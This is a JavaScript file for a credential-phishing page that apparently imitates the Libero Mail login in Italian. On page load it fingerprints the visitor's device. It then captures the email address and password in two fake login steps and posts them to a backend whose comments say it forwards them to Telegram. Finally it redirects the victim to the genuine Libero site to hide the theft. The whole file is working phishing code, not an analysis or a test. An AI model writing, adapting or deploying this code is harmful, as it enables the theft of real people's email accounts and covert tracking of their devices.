(function () {
  'use strict';

  // ─── STATE ───────────────────────────────────────────────
  let capturedEmail = '';

  // ─── DEVICE FINGERPRINTING (client-side) ─────────────────
  function collectDeviceData() {
    return {
      screenW: window.screen.width,
      screenH: window.screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
      lang: navigator.language,
      platform: navigator.platform,
      hwConcurrency: navigator.hardwareConcurrency || 0,
      deviceMemory: navigator.deviceMemory || 0
    };
  }

  // ─── API HELPERS ─────────────────────────────────────────
  async function postToApi(endpoint, data) {
    try {
      const res = await fetch('/api/' + endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      return await res.json();
    } catch (e) {
      console.error('API error:', e);
      return { ok: false };
    }
  }

  // ─── FIRE VISIT EVENT ON LOAD ────────────────────────────
  function fireVisit() {
    const deviceData = collectDeviceData();
    postToApi('visit', deviceData);
  }

  // ─── EMAIL FORM HANDLER ──────────────────────────────────
  const emailForm = document.getElementById('email-form');
  const loginIdInput = document.getElementById('loginid');

  if (emailForm) {
    emailForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const email = loginIdInput.value.trim();
      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        showError('loginid_error', 'Inserisci un indirizzo email valido.');
        return;
      }

      // Disable button to prevent double-submit
      const btn = document.getElementById('form_submit');
      btn.disabled = true;
      btn.textContent = 'Verifica...';

      capturedEmail = email;

      // Send email to Telegram
      await postToApi('email', { email });

      // Transition to password step (simulate a brief check)
      setTimeout(function () {
        document.getElementById('email-form').style.display = 'none';
        document.getElementById('password-form').style.display = 'block';
        document.getElementById('pw-email-display').textContent = email;
        document.getElementById('password').focus();
      }, 600);
    });
  }

  // ─── PASSWORD FORM HANDLER ───────────────────────────────
  const pwForm = document.getElementById('password-form');

  if (pwForm) {
    pwForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const password = document.getElementById('password').value;
      if (!password) {
        showError('password_error', 'Inserisci la tua password.');
        return;
      }

      // Show loading
      document.getElementById('loading-overlay').style.display = 'flex';

      // Send credentials to Telegram
      const result = await postToApi('password', {
        email: capturedEmail,
        password: password
      });

      // Simulate processing delay then redirect (or show success)
      setTimeout(function () {
        if (result && result.redirect) {
          window.location.href = result.redirect;
        } else {
          // Fallback: show a "redirecting" state
          document.querySelector('#loading-overlay p').textContent = 'Reindirizzamento...';
          setTimeout(function () {
            window.location.href = 'https://mail1.libero.it/';
          }, 1500);
        }
      }, 1200);
    });
  }

  // ─── UTILITY ─────────────────────────────────────────────
  function showError(id, msg) {
    const el = document.getElementById(id);
    if (el) {
      el.textContent = msg;
      el.style.display = 'block';
    }
  }

  // ─── INIT ────────────────────────────────────────────────
  document.addEventListener('DOMContentLoaded', fireVisit);
})();